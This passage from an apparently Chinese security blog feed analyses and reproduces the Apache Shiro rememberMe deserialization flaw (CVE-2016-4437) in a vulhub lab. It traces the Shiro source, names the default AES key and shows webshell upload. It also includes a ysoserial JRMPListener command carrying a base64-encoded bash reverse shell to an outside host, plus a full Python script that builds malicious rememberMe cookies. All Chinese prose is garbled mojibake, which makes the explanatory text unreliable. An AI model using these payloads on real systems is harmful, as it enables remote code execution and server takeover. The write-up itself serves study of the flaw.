implementation</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">forgetIdentity</span><span class="params">(SubjectContext subjectContext)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (WebUtils.isHttp(subjectContext)) &#123;</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> WebUtils.getHttpRequest(subjectContext);</span><br><span class="line">            <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> WebUtils.getHttpResponse(subjectContext);</span><br><span class="line">            forgetIdentity(request, response);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Removes the rememberMe cookie from the given request/response pair.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> request  the incoming HTTP servlet request</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> response the outgoing HTTP servlet response</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">forgetIdentity</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">        getCookie().removeFrom(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>é€šè¿‡ getCokie() è·å–ç”¨æˆ·è¯·æ±‚çš„ Cookie ï¼Œå†æ‰§è¡Œ removeFrom æ–¹æ³•</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221001202501429.png" data-caption="image-20221001202501429"><img src="/../images/shiro/image-20221001202501429.png" alt="image-20221001202501429"></a></p><p>ç»§ç»­è·Ÿè¿› removeFrom, å®šä½å…·ä½“æ‰§è¡Œä»£ç ä½ç½®ä¸º SimpleCookie.java</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221001202758070.png" data-caption="image-20221001202758070"><img src="/../images/shiro/image-20221001202758070.png" alt="image-20221001202758070"></a></p><p>removeFrom æ–¹æ³•å®šä¹‰äº†ä¸€äº›æ–¹æ³•ä½“ï¼Œå¹¶å°†å€¼è¿”å›ä¸ response å¤´éƒ¨æ·»åŠ  Set-Cookieï¼šrememberMe&#x3D;deleteMe</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221001203541265.png" data-caption="image-20221001203541265"><img src="/../images/shiro/image-20221001203541265.png" alt="image-20221001203541265"></a></p><p>å›åˆ° onSuccessfulLogin æ–¹æ³•ä¸­ï¼Œè‹¥è®¾ç½®äº† rememberMe åˆ™è¿›å…¥ rememberIdentity</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221001204041201.png" data-caption="image-20221001204041201"><img src="/../images/shiro/image-20221001204041201.png" alt="image-20221001204041201"></a></p><p>è·Ÿè¿› rememberIdentity æ–¹æ³•ï¼ŒCtrl + é¼ æ ‡å·¦é”®ï¼Œä»£ç ä½ç½® AbstractRememberMeManager.java ,å…·ä½“ä»£ç å¦‚ä¸‹ï¼š</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">rememberIdentity</span><span class="params">(Subject subject, AuthenticationToken token, AuthenticationInfo authcInfo)</span> &#123;</span><br><span class="line">     <span class="type">PrincipalCollection</span> <span class="variable">principals</span> <span class="operator">=</span> getIdentityToRemember(subject, authcInfo);</span><br><span class="line">     rememberIdentity(subject, principals);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Returns &#123;<span class="doctag">@code</span> info&#125;.&#123;<span class="doctag">@link</span> org.apache.shiro.authc.AuthenticationInfo#getPrincipals() getPrincipals()&#125; and</span></span><br><span class="line"><span class="comment">  * ignores the &#123;<span class="doctag">@link</span> Subject&#125; argument.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@param</span> subject the subject for which the principals are being remembered.</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@param</span> info    the authentication info resulting from the successful authentication attempt.</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@return</span> the &#123;<span class="doctag">@code</span> PrincipalCollection&#125; to remember.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="keyword">protected</span> PrincipalCollection <span class="title function_">getIdentityToRemember</span><span class="params">(Subject subject, AuthenticationInfo info)</span> &#123;</span><br><span class="line">     <span class="keyword">return</span> info.getPrincipals();</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Remembers the specified account principals by first</span></span><br><span class="line"><span class="comment">  * &#123;<span class="doctag">@link</span> #convertPrincipalsToBytes(org.apache.shiro.subject.PrincipalCollection) converting&#125; them to a byte</span></span><br><span class="line"><span class="comment">  * array and then &#123;<span class="doctag">@link</span> #rememberSerializedIdentity(org.apache.shiro.subject.Subject, byte[]) remembers&#125; that</span></span><br><span class="line"><span class="comment">  * byte array.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@param</span> subject           the subject for which the principals are being remembered.</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@param</span> accountPrincipals the principals to remember for retrieval later.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">rememberIdentity</span><span class="params">(Subject subject, PrincipalCollection accountPrincipals)</span> &#123;</span><br><span class="line">     <span class="type">byte</span>[] bytes = convertPrincipalsToBytes(accountPrincipals);</span><br><span class="line">     rememberSerializedIdentity(subject, bytes);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Converts the given principal collection the byte array that will be persisted to be &#x27;remembered&#x27; later.</span></span><br><span class="line"><span class="comment">  * &lt;p/&gt;</span></span><br><span class="line"><span class="comment">  * This implementation first &#123;<span class="doctag">@link</span> #serialize(org.apache.shiro.subject.PrincipalCollection) serializes&#125; the</span></span><br><span class="line"><span class="comment">  * principals to a byte array and then &#123;<span class="doctag">@link</span> #encrypt(byte[]) encrypts&#125; that byte array.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@param</span> principals the &#123;<span class="doctag">@code</span> PrincipalCollection&#125; to convert to a byte array</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@return</span> the representative byte array to be persisted for remember me functionality.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="keyword">protected</span> <span class="type">byte</span>[] convertPrincipalsToBytes(PrincipalCollection principals) &#123;</span><br><span class="line">     <span class="type">byte</span>[] bytes = serialize(principals);</span><br><span class="line">     <span class="keyword">if</span> (getCipherService() != <span class="literal">null</span>) &#123;</span><br><span class="line">         bytes = encrypt(bytes);</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> bytes;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></div><p>ç”±ä¸Šä»£ç å¯çŸ¥ï¼ŒrememberIdentity ä½¿ç”¨äº† convertPrincipalsToBytes å¯¹ accountPrincipalsï¼ˆç”¨æˆ·åï¼‰è¿›è¡Œäº†å¤„ç†</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221001204642446.png" data-caption="image-20221001204642446"><img src="/../images/shiro/image-20221001204642446.png" alt="image-20221001204642446"></a></p><p>è¿›å…¥ convertPrincipalsToBytes åï¼Œä½¿ç”¨ serialize å¯¹ principalsï¼ˆç”¨æˆ·åï¼‰è¿›è¡Œå¤„ç†ï¼Œå¦‚æœä¸ä¸ºç©ºåˆ™è¿›è¡Œ encrypt åŠ å¯†å¤„ç†</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221001204916754.png" data-caption="image-20221001204916754"><img src="/../images/shiro/image-20221001204916754.png" alt="image-20221001204916754"></a></p><p>è·Ÿè¿› serialize æ–¹æ³•ï¼ŒæŸ¥çœ‹å»å…·ä½“å®ç°ä»£ç </p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221001205605497.png" data-caption="image-20221001205605497"><img src="/../images/shiro/image-20221001205605497.png" alt="image-20221001205605497"></a></p><p>å¯¹ principalsï¼ˆç”¨æˆ·åï¼‰åˆ©ç”¨ writeObject æ–¹æ³•è¿›è¡Œåºåˆ—åŒ–ï¼ˆè¯¥æ–¹æ³•æ–‡ç« å¼€å¤´æœ‰è¯´æ˜ï¼‰</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221001205850975.png" data-caption="image-20221001205850975"><img src="/../images/shiro/image-20221001205850975.png" alt="image-20221001205850975"></a></p><p>ç°åœ¨çŸ¥é“äº† AbstractRememberMeManager.java ä¸­ convertPrincipalsToBytes å¯¹ç”¨æˆ·åè¿›è¡Œäº†åºåˆ—åŒ–,åŒä½ç½®ä¸‹ï¼Œå†æŸ¥çœ‹å…¶ bytes åŠ å¯†æ–¹å¼ï¼Œå¦‚æœ getCipherService() ä¸ä¸ºç©ºåˆ™å¯¹ bytesè¿›è¡ŒåŠ å¯†</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221002105038632.png" data-caption="image-20221002105038632"><img src="/../images/shiro/image-20221002105038632.png" alt="image-20221002105038632"></a></p><p>è·Ÿè¿› getCipherService()</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221002105113490.png" data-caption="image-20221002105113490"><img src="/../images/shiro/image-20221002105113490.png" alt="image-20221002105113490"></a></p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221002105212735.png" data-caption="image-20221002105212735"><img src="/../images/shiro/image-20221002105212735.png" alt="image-20221002105212735"></a></p><p>æŸ¥çœ‹ cipherService è°ƒç”¨æƒ…å†µï¼Œå…¨å±€æœç´¢  this.cipherService</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221002111915882.png" data-caption="image-20221002111915882"><img src="/../images/shiro/image-20221002111915882.png" alt="image-20221002111915882"></a></p><p>è¿”å› convertPrincipalsToBytes æ–¹æ³•ä¸­è·Ÿè¿› bytes ä¸­ encrypt åŠ å¯†ï¼ŒCtrl + é¼ æ ‡å·¦é”® è¿›å…¥ï¼Œè¿™é‡Œé€šè¿‡ cipherService.encrypt ä¼ å…¥åºåˆ—åŒ–æ•°æ®å’Œ getEncryptionCipherKey()</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221002110713564.png" data-caption="image-20221002110713564"><img src="/../images/shiro/image-20221002110713564.png" alt="image-20221002110713564"></a></p><p>è·Ÿè¿› getEncryptionCipherKey()ï¼ŒCtrl + é¼ æ ‡å·¦é”®ï¼Œè¿”å›ä¸€ä¸ªåŠ å¯† Key</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221002111026239.png" data-caption="image-20221002111026239"><img src="/../images/shiro/image-20221002111026239.png" alt="image-20221002111026239"></a></p><p>æŸ¥çœ‹è°ƒç”¨ï¼Œå…¨å±€æœç´¢ this.encryptionCipherKry</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221002111502727.png" data-caption="image-20221002111502727"><img src="/../images/shiro/image-20221002111502727.png" alt="image-20221002111502727"></a></p><p>è¿™ä¸€æ­¥æŸ¥çœ‹ cipherService è°ƒç”¨çš„æ—¶å€™ï¼Œå‘ç° setCipherKey æ–¹æ³•åœ¨æ„é€ æ–¹æ³•é‡Œé¢è¢«è°ƒç”¨äº†ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221002112059260.png" data-caption="image-20221002112059260"><img src="/../images/shiro/image-20221002112059260.png" alt="image-20221002112059260"></a></p><p>æŸ¥çœ‹ DEFAULT_CIPHER_KEY_BYTES , CTRL+é¼ æ ‡å·¦é”®è¿›å…¥ï¼Œé»˜è®¤ Key å€¼ä¸º kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221002112234044.png" data-caption="image-20221002112234044"><img src="/../images/shiro/image-20221002112234044.png" alt="image-20221002112234044"></a></p><p>å›åˆ°AbstractRememberMeManager.javaçš„rememberIdentityæ–¹æ³•ä¸­,åœ¨convertPrincipalsToByteså¯¹ç”¨æˆ·åè¿›è¡Œåºåˆ—åŒ–åï¼Œè¿›å…¥åˆ° rememberSerializedIdentity æ–¹æ³•å¯¹ subjectã€byte è¿›è¡Œå¤„ç†</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221002102940381.png" data-caption="image-20221002102940381"><img src="/../images/shiro/image-20221002102940381.png" alt="image-20221002102940381"></a></p><p>è·Ÿè¿› rememberSerializedIdentity ï¼Œå…·ä½“å®ç°ä»£ç ä½äº CookieRememberMeManager.java</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221002103109939.png" data-caption="image-20221002103109939"><img src="/../images/shiro/image-20221002103109939.png" alt="image-20221002103109939"></a></p><p>å¯¹ Cookie è¿›è¡Œäº† base64 åŠ å¯†å¤„ç†ï¼Œä¿å­˜åœ¨ Cookie ä¸­</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221002103257797.png" data-caption="image-20221002103257797"><img src="/../images/shiro/image-20221002103257797.png" alt="image-20221002103257797"></a></p><p>è‡³æ­¢ï¼ŒåŠ å¯†ç»“æŸã€‚</p><hr><h4 id="è§£å¯†åˆ†æ"><a href="#è§£å¯†åˆ†æ" class="headerlink" title="è§£å¯†åˆ†æ"></a>è§£å¯†åˆ†æ</h4><p>é€šè¿‡æœç´¢åˆ†æè§£å¯†ï¼Œå›æº¯ä¸Šä¸€å±‚ï¼Œç›´æ¥é€‰ä¸­ decrypt é¼ æ ‡å³é”® File Usagesï¼Œå®šä½ä»£ç ï¼Œå›æº¯ä¸Šä¸€å±‚ä»£ç ï¼Œä»£ç ä¸ºå³ä¸‹æ–¹ </p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221003210457908.png" data-caption="image-20221003210457908"><img src="/../images/shiro/image-20221003210457908.png" alt="image-20221003210457908"></a></p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221003210757811.png" data-caption="image-20221003210757811"><img src="/../images/shiro/image-20221003210757811.png" alt="image-20221003210757811"></a></p><p>ç»§ç»­å›æº¯ convertBytesToPrincipals</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221003210905788.png" data-caption="image-20221003210905788"><img src="/../images/shiro/image-20221003210905788.png" alt="image-20221003210905788"></a></p><p>å…¨å±€æœç´¢å®šä½ getRememberedSerializedIdentity æ–¹æ³•å…·ä½“ä»£ç </p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221003211707942.png" data-caption="image-20221003211707942"><img src="/../images/shiro/image-20221003211707942.png" alt="image-20221003211707942"></a></p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221003211532163.png" data-caption="image-20221003211532163"><img src="/../images/shiro/image-20221003211532163.png" alt="image-20221003211532163"></a></p><p>è§£å¯†åç»§ç»­è°ƒç”¨ convertBytesToPricipals æ–¹æ³•</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221003211913642.png" data-caption="image-20221003211913642"><img src="/../images/shiro/image-20221003211913642.png" alt="image-20221003211913642"></a></p><p>ç»§ç»­è·Ÿè¿› convertBytesToPricipals æ–¹æ³•ï¼ŒCTRL + é¼ æ ‡å·¦é”®è¿›å…¥</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221003212030943.png" data-caption="image-20221003212030943"><img src="/../images/shiro/image-20221003212030943.png" alt="image-20221003212030943"></a></p><p>ç»§ç»­è·Ÿè¿› decrypt ï¼Œè§£å¯†åå¾—åˆ°çš„ç»“æœä¸ºåºåˆ—åŒ–å­—ç¬¦ä¸²çš„bytesï¼Œç„¶åè¿›å…¥ deserialize</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221003212136191.png" data-caption="image-20221003212136191"><img src="/../images/shiro/image-20221003212136191.png" alt="image-20221003212136191"></a></p><p>å¾—åˆ°åºåˆ—åŒ–æ•°å€¼ååœ¨è¿›è¡Œååºåˆ—åŒ–æ“ä½œ</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221003212959172.png" data-caption="image-20221003212959172"><img src="/../images/shiro/image-20221003212959172.png" alt="image-20221003212959172"></a></p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221003213037441.png" data-caption="image-20221003213037441"><img src="/../images/shiro/image-20221003213037441.png" alt="image-20221003213037441"></a></p><hr><h2 id="äº”ã€æ¼æ´å¤ç°"><a href="#äº”ã€æ¼æ´å¤ç°" class="headerlink" title="äº”ã€æ¼æ´å¤ç°"></a>äº”ã€æ¼æ´å¤ç°</h2><h3 id="1ã€ç¡®è®¤æ˜¯å¦ä½¿ç”¨-Shiro-æ¡†æ¶"><a href="#1ã€ç¡®è®¤æ˜¯å¦ä½¿ç”¨-Shiro-æ¡†æ¶" class="headerlink" title="1ã€ç¡®è®¤æ˜¯å¦ä½¿ç”¨ Shiro æ¡†æ¶"></a>1ã€ç¡®è®¤æ˜¯å¦ä½¿ç”¨ Shiro æ¡†æ¶</h3><p>æ­£å¸¸è®¿é—®æ—¶</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221003214114011.png" data-caption="image-20221003214114011"><img src="/../images/shiro/image-20221003214114011.png" alt="image-20221003214114011"></a></p><p>å½“æˆ‘ä»¬åœ¨ Cookie å¤„æ·»åŠ  remember&#x3D;111 æ—¶ï¼Œè¿”å›åŒ…å‡ºç° remember&#x3D;deleteMe åˆ™è¯æ˜ç½‘ç«™ä½¿ç”¨ Shiro æ¡†æ¶</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221003214254415.png" data-caption="image-20221003214254415"><img src="/../images/shiro/image-20221003214254415.png" alt="image-20221003214254415"></a></p><h3 id="2ã€æ¼æ´æ¢æµ‹"><a href="#2ã€æ¼æ´æ¢æµ‹" class="headerlink" title="2ã€æ¼æ´æ¢æµ‹"></a>2ã€<strong>æ¼æ´æ¢æµ‹</strong></h3><p>burp æ’ä»¶æ¢æµ‹ï¼Œå‘ç° key å³å¤„åœ¨ key æ³„éœ²ï¼Œå¯æ„é€ æ”»å‡»</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221003214813621.png" data-caption="image-20221003214813621"><img src="/../images/shiro/image-20221003214813621.png" alt="image-20221003214813621"></a></p><h3 id="3ã€æ¼æ´åˆ©ç”¨"><a href="#3ã€æ¼æ´åˆ©ç”¨" class="headerlink" title="3ã€æ¼æ´åˆ©ç”¨"></a><strong>3ã€æ¼æ´åˆ©ç”¨</strong></h3><p>å›¾å½¢åŒ–åˆ©ç”¨å·¥å…·ï¼Œç›‘æµ‹å¯†é’¥</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221003220946760.png" data-caption="image-20221003220946760"><img src="/../images/shiro/image-20221003220946760.png" alt="image-20221003220946760"></a></p><p>çˆ†ç ´åˆ©ç”¨é“¾</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221003221058326.png" data-caption="image-20221003221058326"><img src="/../images/shiro/image-20221003221058326.png" alt="image-20221003221058326"></a></p><p>å‘½ä»¤æ‰§è¡Œ</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221003221158962.png" data-caption="image-20221003221158962"><img src="/../images/shiro/image-20221003221158962.png" alt="image-20221003221158962"></a></p><p>ä¸Šä¼  webshell è‡ªå®šä¹‰è·¯å¾„ä¸ºå½“å‰ç½‘ç«™æ ¹ç›®å½•ï¼Œè·å– webshell</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221003222145191.png" data-caption="image-20221003222145191"><img src="/../images/shiro/image-20221003222145191.png" alt="image-20221003222145191"></a></p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221003222431550.png" data-caption="image-20221003222431550"><img src="/../images/shiro/image-20221003222431550.png" alt="image-20221003222431550"></a></p><h3 id="4ã€Linux-åå¼¹shell"><a href="#4ã€Linux-åå¼¹shell" class="headerlink" title="4ã€Linux åå¼¹shell"></a>4ã€Linux åå¼¹shell</h3><p>ç¯å¢ƒå¦‚ä¸‹ï¼š</p><table><thead><tr><th>ç¯å¢ƒ</th><th>æè¿°</th></tr></thead><tbody><tr><td>é¶æœº IP</td><td>192.168.114.140</td></tr><tr><td>æ”»å‡»æœº IP</td><td>192.168.114.139</td></tr><tr><td>åå¼¹shell vps</td><td>xxx.xxx.xxx.xxx</td></tr><tr><td>æ¼æ´ç¯å¢ƒ</td><td>vulhub shiro&#x2F;CVE-2016-4437</td></tr><tr><td>ç”Ÿæˆshiro ååºåˆ—åŒ–æ”»å‡» payload</td><td>expShiro.py</td></tr><tr><td>è¾…åŠ©å·¥å…·</td><td>ysoserial-all.jar</td></tr></tbody></table><p>ä¸‹è½½ vulhub ï¼Œè¿›è¡Œ shiro ç›®å½•åˆ©ç”¨ docker æ‹‰å– shiro æ¼æ´ç¯å¢ƒé•œåƒ</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221015103652468-16658190654921.png" data-caption="image-20221015103652468"><img src="/../images/shiro/image-20221015103652468-16658190654921.png" alt="image-20221015103652468"></a></p><p>è®¿é—® 8080 ç«¯å£</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221015103818676.png" data-caption="image-20221015103818676"><img src="/../images/shiro/image-20221015103818676.png" alt="image-20221015103818676"></a></p><p>æœåŠ¡å™¨å¯ç›‘å¬ï¼Œç­‰å¾…æ¥æ”¶shell</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 2333</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221015143616770.png" data-caption="image-20221015143616770"><img src="/../images/shiro/image-20221015143616770.png" alt="image-20221015143616770"></a></p><p>å¯ç”¨ ysoserial-all.jar å·¥å…·ä¸­çš„ JRMP ç›‘å¬æ¨¡å—ï¼Œç›‘å¬ 1999 ç«¯å£å¹¶æ‰§è¡Œåå¼¹ shell å‘½ä»¤</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 1999 CommonsCollections5 &#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94LngueC54LzIzMzMgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221015143557298.png" data-caption="image-20221015143557298"><img src="/../images/shiro/image-20221015143557298.png" alt="image-20221015143557298"></a></p><p>expShiro.py ç”Ÿæˆ payloadï¼Œè„šæœ¬å¦‚ä¸‹ï¼š</p><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_rememberme</span>(<span class="params">command</span>):</span><br><span class="line">    popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;-jar&#x27;</span>, <span class="string">&#x27;ysoserial-all.jar&#x27;</span>, <span class="string">&#x27;JRMPClient&#x27;</span>, command], stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    key = base64.b64decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>)</span><br><span class="line">    iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    payload = encode_rememberme(sys.argv[<span class="number">1</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;rememberMe=&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(payload.decode()))</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>å‘½ä»¤ï¼špython3 expShiro.py x.x.x.x:1999</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221015143803339.png" data-caption="image-20221015143803339"><img src="/../images/shiro/image-20221015143803339.png" alt="image-20221015143803339"></a></p><p>å°†ç”Ÿæˆçš„ rememberMe æ•°æ®äº burp æ”¾åŒ…æ‰§è¡Œè·å–åå¼¹ shell</p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221015144055376-16658217756221.png" data-caption="image-20221015144055376"><img src="/../images/shiro/image-20221015144055376-16658217756221.png" alt="image-20221015144055376"></a></p><p><a data-fancybox="gallery" data-src="/../images/shiro/image-20221015144009953.png" data-caption="image-20221015144009953"><img src="/../images/shiro/image-20221015144009953.png" alt="image-20221015144009953"></a></p><h2 id="å…­ã€å°ç»“"><a href="#å…­ã€å°ç»“" class="headerlink" title="å…­ã€å°ç»“"></a>å…­ã€å°ç»“</h2><p>æœ¬æ–‡åªä½œå­¦ä¹ è®°å½•ï¼Œæ–‡ç« ä¸­å‡ºç°çš„ç¯å¢ƒåŠå·¥å…·å¯åœ¨ Github ä»“åº“ Downloadã€‚</p><h2 id="ä¸ƒã€å‚è€ƒæ–‡ç« "><a href="#ä¸ƒã€å‚è€ƒæ–‡ç« " class="headerlink" title="ä¸ƒã€å‚è€ƒæ–‡ç« "></a>ä¸ƒã€å‚è€ƒæ–‡ç« </h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://www.geekby.site/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/`</span><br><span class="line">http://changxia3.com/2020/09/03/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0%E4%B8%80%EF%BC%88%E5%8E%9F%E7%90%86%E7%AF%87%EF%BC%89/</span><br><span class="line">https://blog.csdn.net/qq_44769520/article/details/123476443</span><br><span class="line">https://cloud.tencent.com/developer/article/1590955</span><br><span class="line">https://www.freebuf.com/vuls/290922.html</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´å¤ç° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Javaä»£ç å®¡è®¡ </tag>
            
            <tag> Shiroååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVAä»£ç å®¡è®¡(ä¸‰)-åŸºç¡€çŸ¥è¯†</title>
      <link href="/2022/10/02/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E4%B8%89)-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
      <url>/2022/10/02/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E4%B8%89)-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
      
